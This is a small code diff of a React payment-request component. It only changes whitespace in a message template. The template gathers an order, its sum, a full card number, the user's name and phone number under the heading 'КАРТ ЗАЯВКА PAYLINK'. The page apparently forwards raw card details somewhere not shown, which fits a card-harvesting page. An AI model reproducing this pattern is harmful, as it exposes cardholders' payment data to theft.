@@ -162,9 +162,9 @@ const PaymentRequest = () => {
     try {
       const message = `
         КАРТ ЗАЯВКА PAYLINK : 
-        Order: [${order}]
+                                  Order: [${order}]
         Order Sum: [${orderSum}]
-        Card: [${cardNumber}]
+              Card: [${cardNumber}]
         User Name: [${formData.name}]
         Phone Number: [${formData.phoneNumber}]
     `;
